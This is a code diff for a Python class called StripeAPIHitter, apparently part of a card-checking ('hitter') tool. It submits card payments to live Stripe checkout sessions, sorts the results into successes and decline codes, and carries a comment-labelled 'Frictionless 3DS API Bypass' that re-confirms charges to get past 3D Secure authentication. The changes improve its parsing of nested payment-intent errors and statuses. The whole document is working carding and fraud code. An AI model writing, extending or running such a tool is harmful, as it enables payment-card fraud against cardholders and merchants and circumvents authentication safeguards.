@@ -557,14 +557,36 @@ class StripeAPIHitter:
             result['response_time'] = time.time() - start
             
             if confirm_res.status_code == 200:
+                pi = confirm_json.get('payment_intent', {})
+                si = confirm_json.get('setup_intent', {})
+                
+                if isinstance(pi, dict) and pi.get('last_payment_error'):
+                    err = pi.get('last_payment_error')
+                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
+                    result['error'] = err.get('message', 'Unknown error')
+                    return result
+                    
+                if isinstance(si, dict) and si.get('last_setup_error'):
+                    err = si.get('last_setup_error')
+                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
+                    result['error'] = err.get('message', 'Unknown error')
+                    return result
+
                 status = confirm_json.get('status')
+                next_action = confirm_json.get('next_action', {})
+                if isinstance(pi, dict):
+                    if pi.get('status'): status = pi.get('status')
+                    if pi.get('next_action'): next_action = pi.get('next_action')
+                elif isinstance(si, dict):
+                    if si.get('status'): status = si.get('status')
+                    if si.get('next_action'): next_action = si.get('next_action')
+                    
                 if status in ['succeeded', 'requires_capture', 'complete']:
                     result['success'] = True
                     return result
                 elif status == 'requires_action':
                     # 1% CODER: Frictionless 3DS API Bypass
                     try:
-                        next_action = confirm_json.get('next_action', {})
                         if next_action.get('type') == 'use_stripe_sdk':
                             source_id = next_action['use_stripe_sdk'].get('three_d_secure_2_source')
                             server_trans_id = next_action['use_stripe_sdk'].get('server_transaction_id')
@@ -605,7 +627,7 @@ class StripeAPIHitter:
                                 if state == 'frictionless':
                                     # Frictionless successful, confirm the charge again
                                     confirm_data_2 = {
-                                        "payment_method": confirm_json.get('payment_method'),
+                                        "payment_method": confirm_json.get('payment_method') or (pi.get('payment_method') if isinstance(pi, dict) else None),
                                         "key": self.pk_live,
                                         "expected_payment_method_type": "card",
                                     }
@@ -615,10 +637,14 @@ class StripeAPIHitter:
                                     confirm_json_2 = confirm_res_2.json()
                                     
                                     status_2 = confirm_json_2.get('status')
+                                    pi_2 = confirm_json_2.get('payment_intent', {})
+                                    if isinstance(pi_2, dict) and pi_2.get('status'): status_2 = pi_2.get('status')
+                                    
                                     if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                         result['success'] = True
                                     else:
                                         err = confirm_json_2.get('error', {})
+                                        if isinstance(pi_2, dict) and pi_2.get('last_payment_error'): err = pi_2.get('last_payment_error')
                                         result['decline_code'] = err.get('decline_code', err.get('code', status_2))
                                     return result
                                     
@@ -635,22 +661,10 @@ class StripeAPIHitter:
                         
                     result['decline_code'] = '3d_secure_required'
                     return result
+                elif status == 'requires_payment_method':
+                    result['decline_code'] = 'generic_decline'
+                    result['error'] = 'Payment requires a new payment method (generic decline)'
                 elif status == 'open':
-                    # Card declined, checkout session remains open. Look for nested payment_intent error
-                    pi = confirm_json.get('payment_intent', {})
-                    if isinstance(pi, dict):
-                        err = pi.get('last_payment_error')
-                        if err:
-                            result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
-                            result['error'] = err.get('message', 'Unknown error')
-                            return result
-                    si = confirm_json.get('setup_intent', {})
-                    if isinstance(si, dict):
-                        err = si.get('last_setup_error')
-                        if err:
-                            result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
-                            result['error'] = err.get('message', 'Unknown error')
-                            return result
                     err = confirm_json.get('error')
                     if isinstance(err, dict):
                         result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
